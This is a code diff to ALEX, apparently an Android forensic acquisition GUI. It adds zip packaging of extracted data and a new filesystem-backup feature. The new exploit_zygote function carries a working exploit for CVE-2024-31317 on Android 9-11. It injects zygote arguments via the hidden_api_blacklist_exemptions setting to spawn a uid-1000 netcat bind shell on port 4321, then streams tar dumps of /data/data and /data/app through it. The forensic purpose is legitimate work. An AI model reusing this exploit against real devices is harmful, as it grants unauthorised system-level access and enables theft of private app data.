@@ -17,6 +17,9 @@ from importlib.metadata import version
 from adbutils._utils import append_path
 from io import BytesIO
 from pdfme import build_pdf
+import shutil
+import zipfile
+import tarfile
 import hashlib
 import imagehash
 import tempfile
@@ -26,12 +29,13 @@ import subprocess
 import platform
 import shutil
 import socket
+import select
 import stat
 import time
 import typing
 import pathlib
 import re
-
+import io
 
 ctk.set_appearance_mode("dark")  # Dark Mode
 ctk.set_default_color_theme(os.path.join(os.path.dirname(__file__), "assets" , "alex_theme.json" ))
@@ -157,7 +161,7 @@ class MyApp(ctk.CTk):
             ctk.CTkButton(self.dynamic_frame, text="Logging Options", command=lambda: self.switch_menu("LogMenu"), width=200, height=70, font=self.stfont),
             ctk.CTkButton(self.dynamic_frame, text="Advanced Options", command=lambda: self.switch_menu("AdvMenu"), width=200, height=70, font=self.stfont),
         ]
-        self.menu_text = ["Save informations about the device and installed apps.", 
+        self.menu_text = ["Save information about the device and installed apps.", 
                           "Allows logical, advanced logical and filesystem\nextractions.", 
                           "Collect the Bugreport, dumpsys and logcat logs",
                           "More specific options like screenshotting."]
@@ -195,6 +199,8 @@ class MyApp(ctk.CTk):
             self.show_save_device_info()
         elif menu_name == "PullData":
             self.show_pull_data()
+        elif menu_name == "PRFS":
+            self.show_prfs()
         elif menu_name == "ADBBU":
             self.show_adb_bu()
         elif menu_name == "LogDump":
@@ -382,9 +388,11 @@ class MyApp(ctk.CTk):
         self.menu_buttons = [
             ctk.CTkButton(self.dynamic_frame, text="Pull \"sdcard\"", command=lambda: self.switch_menu("PullData"), width=200, height=70, font=self.stfont),
             ctk.CTkButton(self.dynamic_frame, text="ADB Backup", command=lambda: self.switch_menu("ADBBU"), width=200, height=70, font=self.stfont),
+            ctk.CTkButton(self.dynamic_frame, text="Partially Restored\nFilesystem Backup", command=lambda: self.switch_menu("PRFS"), width=200, height=70, font=self.stfont),
         ]
         self.menu_text = ["Extract the content of \"/sdcard/\" as a folder.",
-                          "Perform an ADB-Backup."]
+                          "Perform an ADB-Backup.",
+                          "Try to reconstruct parts of the device-filesystem"]
         self.menu_textbox = []
         for btn in self.menu_buttons:
             self.menu_textbox.append(ctk.CTkLabel(self.dynamic_frame, width=right_content, height=70, font=self.stfont, anchor="w", justify="left"))
@@ -504,6 +512,8 @@ class MyApp(ctk.CTk):
         self.get_dsize.start()
         self.wait_variable(self.change)
         folder = f'Data_{snr}_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
+        zip_path = f"{folder}.zip"
+        zip = zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
         try: os.mkdir(folder)
         except: pass
         self.change.set(0)
@@ -513,9 +523,12 @@ class MyApp(ctk.CTk):
         self.progress.set(0)
         self.prog_text.configure(text="0%")
         self.progress.pack()
-        self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change))
+        self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip))
         self.pull_data.start()
         self.wait_variable(self.change)
+        zip.close()
+        try: shutil.rmtree(folder)
+        except: pass
         self.text.configure(text="Data Extraction complete.")
         self.prog_text.pack_forget()
         self.progress.pack_forget()
@@ -546,6 +559,55 @@ class MyApp(ctk.CTk):
         self.prog_text.pack_forget()
         self.progress.pack_forget()
         self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))  
+
+    #Show the "PRFS"-Backup screen
+    def show_prfs(self):
+        ctk.CTkLabel(self.dynamic_frame, text=f"ALEX by Christian Peter  -  Output: {dir_top}", text_color="#3f3f3f", height=60, padx=40, font=self.stfont).pack(anchor="w")
+        ctk.CTkLabel(self.dynamic_frame, text="PRFS Backup", height=60, width=585, font=("standard",24), justify="left").pack(pady=20)
+        self.text = ctk.CTkLabel(self.dynamic_frame, text="Preparing Data Extraction ...", width=585, height=60, font=self.stfont, anchor="w", justify="left")
+        self.text.pack(anchor="center", pady=25)
+        global data_size
+        total_size = 1
+        data_size = 0
+        data_path = "/sdcard/"
+        self.change = ctk.IntVar(self, 0)
+        self.get_dsize = threading.Thread(target=lambda: get_data_size(data_path, self.change))
+        self.get_dsize.start()
+        self.wait_variable(self.change)
+        folder = f'{snr}_prfs_{str(datetime.now().strftime("%Y_%m_%d_%H_%M_%S"))}'
+        zip_path = f"{folder}.zip"
+        zip = zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=1)
+        try: os.mkdir(folder)
+        except: pass
+        self.change.set(0)
+        self.prog_text = ctk.CTkLabel(self.dynamic_frame, text="0%", width=585, height=20, font=self.stfont, anchor="w", justify="left")
+        self.prog_text.pack()
+        self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0)
+        self.progress.set(0)
+        self.prog_text.configure(text="0%")
+        self.progress.pack()
+        self.pull_data = threading.Thread(target=lambda: pull_dir_mod(device.sync, data_path, folder, text=self.text, prog_text=self.prog_text, progress=self.progress, change=self.change, zip=zip))
+        self.pull_data.start()
+        self.wait_variable(self.change)
+        zip.close()
+        try: shutil.rmtree(folder)
+        except: pass
+        if int(software.split(".")[0]) in range(9,11):
+            self.change.set(0)
+            self.prog_text.configure(text="")
+            self.progress.pack_forget()
+            self.progress = ctk.CTkProgressBar(self.dynamic_frame, width=585, height=30, corner_radius=0, mode="indeterminate", indeterminate_speed=0.5)
+            self.progress.pack()
+            self.progress.start()
+            self.pull_zygote = threading.Thread(target=lambda: exploit_zygote(zip_path=zip_path, text=self.text, prog_text=self.prog_text, change=self.change))
+            self.pull_zygote.start()
+            self.wait_variable(self.change)
+        else:
+            pass
+        self.text.configure(text="Data Extraction complete.")
+        self.prog_text.pack_forget()
+        self.progress.pack_forget()
+        self.after(100, lambda: ctk.CTkButton(self.dynamic_frame, text="OK", font=self.stfont, command=lambda: self.switch_menu("AcqMenu")).pack(pady=40))
 
     def adb_bu(self, change, incl_shared, incl_apps, incl_system):
         self.startb.pack_forget()
@@ -593,7 +655,7 @@ class MyApp(ctk.CTk):
                 f.write(chunk)
                 total += len(chunk)
                 self.prog_text.configure(text=f"{total/1024/1024:.1f} MB written")
-        bu_change.set(1)      
+        bu_change.set(1)    
 
     #Show Bugreport-Screen (Dumpsys)
     def show_bugreport(self):
@@ -1338,6 +1400,9 @@ def get_client(host=default_host, port=default_port, check=False):
                 crypt_type = ""
 
             global apps
+            global all_apps
+            all_app_query = device.shell("pm list packages")
+            all_apps = [line.replace("package:", "") for line in all_app_query.splitlines() if line.strip()]
             app_query = device.shell("pm list packages -3 -i")
             pattern = re.compile(r"package:([^\s]+)\s+installer=([^\s]+)")
             apps = [[pkg, installer] for pkg, installer in pattern.findall(app_query)]
@@ -1457,15 +1522,14 @@ def dump_bugreport(change, progress, prog_text):
     change.set(1)
 
 
-
-
 def get_data_size(data_path, change):
     global total_size
     size_cmd = device.shell(f"du -ks {data_path}")
     total_size = int(size_cmd.split()[0])*1024
     change.set(1)
 
-def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, prog_text, progress, change, exist_ok: bool = True) -> int:
+
+def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, prog_text, progress, change, exist_ok: bool = True, zip=None) -> int:
     """Pull directory from device:src into local:dst
 
     Returns:
@@ -1476,7 +1540,7 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
 
     text.configure(text="Performing Data-Extraction")
 
-    def rec_pull_contents(src: str, dst: typing.Union[str, pathlib.Path], prog_text, progress, exist_ok: bool = True) -> int:
+    def rec_pull_contents(src: str, dst: typing.Union[str, pathlib.Path], rel_in_zip: str, prog_text, progress, exist_ok: bool = True) -> int:
         s = 0
         global data_size
         global total_size
@@ -1495,8 +1559,11 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
             new_src:str = append_path(src, dir.path) 
             new_dst:pathlib.Path = pathlib.Path(append_path(dst, dir.path)) 
             os.makedirs(new_dst, exist_ok=exist_ok)
-            s += rec_pull_contents(new_src, new_dst, prog_text, progress, exist_ok=exist_ok)
-
+            zip_dir_path = f"sdcard/{rel_in_zip}/{dir.path}/"
+            zip.writestr(zip_dir_path, b'')
+            new_rel = f"{rel_in_zip}/{dir.path}"
+            s += rec_pull_contents(new_src, new_dst, new_rel, prog_text, progress, exist_ok=exist_ok)
+                
         for file in files:
             new_src:str = append_path(src, file.path) 
             new_dst:str = append_path(dst, file.path) 
@@ -1504,6 +1571,15 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
                 size = self.pull_file(new_src, new_dst)
             except:
                 size = 0
+            try:
+                with open(new_dst, "rb") as f:
+                    data = f.read()
+                zip_rel_path = f"sdcard/{rel_in_zip}/{file.path}" 
+                zip.writestr(zip_rel_path, data)
+                os.remove(new_dst)
+            except Exception as e:
+                print(f"Error zipping {new_dst}: {e}")
+
             s += size
             data_size += size   
             if data_size > total_size:
@@ -1521,13 +1597,133 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
         dst = pathlib.Path(dst)
         
     os.makedirs(dst, exist_ok=exist_ok)
-    func_size = rec_pull_contents(src, dst, prog_text, progress, exist_ok=exist_ok)
+    func_size = rec_pull_contents(src, dst, rel_in_zip="", prog_text=prog_text, progress=progress, exist_ok=exist_ok)
+    zip.close()
     change.set(1)
     return func_size
 
+# Exploiting CVE-2024–31317 to get system-user files (Android 9-11)
+def exploit_zygote(zip_path, text, prog_text, change):
+
+    text.configure(text="Expoliting CVE-2024–31317 to acquire \"system\"-Files")
+
+    def dump_folder_cve(name, zipname):
+        cmd = f'tar cf - {name} 2>/dev/null\nexit\n'
+        cmd_bytes = cmd.encode("utf-8")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)  
+        start_time = time.time()
+        try:
+            print(f"[+] connecting to {host}:4321 …")
+            sock.connect((host, 4321))
+
+            sock.settimeout(timeout_seconds)
+            print(f"[+] sending command: {cmd.strip()!r}")
+            sock.sendall(cmd_bytes)
+
+            with zipfile.ZipFile(zipname, "a", compression=zipfile.ZIP_DEFLATED) as zf:
+                class SocketReader(io.RawIOBase):
+                    
+                    def read(self, n=-1):
+                        global zytotal
+                        try:
+                            sock_data = sock.recv(n if n > 0 else 65536)
+                            zytotal += len(sock_data)
+                            prog_text.configure(text=f"{zytotal/1024/1024:.1f} MB written")
+                            return sock_data
+                        except socket.timeout:
+                            return b""
+                
+                fileobj = SocketReader()
+
+                with tarfile.open(fileobj=fileobj, mode="r|*") as tar: 
+                    for member in tar:
+                        if not member.isfile():
+                            continue  
+                        f = tar.extractfile(member)
+                        if f is None:
+                            continue
+                        # Lies Datei-Inhalt
+                        data = f.read()
+                        # In die ZIP schreiben (mit originalem Pfadnamen)
+                        zf.writestr(member.name, data)
+                    
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+    def send_and_receive(sock, cmd, idle_timeout=0.3, overall_timeout=4.0):
+        if not cmd.endswith("\n"):
+            cmd = cmd + "\n"
+        sock.sendall(cmd.encode("utf-8"))
+        chunks = []
+        start = time.time()
+        while True:
+            if time.time() - start > overall_timeout:
+                break
+            r, _, _ = select.select([sock], [], [], idle_timeout)
+            if r:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                chunks.append(chunk)
+            else:
+                break
+        return b"".join(chunks).decode("utf-8", errors="ignore")
+
+    device.shell('''settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
+    10
+    --runtime-args
+    --setuid=1000
+    --setgid=1000
+    --runtime-flags=2049
+    --mount-external-full
+    --setgroups=3003
+    --nice-name=runnetcat
+    --seinfo=platform:targetSdkVersion=28:complete
+    --invoke-with
+    toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
+    "
+    settings delete global hidden_api_blacklist_exemptions
+    sleep 2
+    ''')
+    cmd = '''sh -c \"echo 'whoami' | toybox nc localhost 4321\"'''
+    whoami = device.shell(cmd)
+    print(whoami)
+    device.forward("tcp:4321", "tcp:4321")
+    host = "localhost"
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)  
+    sock.connect((host, 4321))
+    data_test = send_and_receive(sock=sock, cmd='ls /data')
+
+    timeout_seconds=600
+
+    app_uid = {}
+    device.forward("tcp:4321", "tcp:4321")
+
+    if "/data: Permission denied" in data_test:
+        for app in all_apps:
+            app_user = send_and_receive(sock=sock, cmd=f"stat /data/data/{app}")
+            uid_re = re.search(r'Uid:\s*\(\s*(\d+)\s*/', app_user)
+            uid = uid_re.group(1) if uid_re else None            
+            if uid != "1000" and uid != None:
+                pass
+            else:
+                dump_folder_cve(f"/data/data/{app}", zip_path)
+        dump_folder_cve("/data/app", zip_path)
+
+    else:
+        dump_folder_cve("/data/", zip_path)
+    change.set(1)
+
 device = None
+zytotal =0
 paired = False
 apps = []
+all_apps = []
 adb = None
 state = None
 case_number = ""
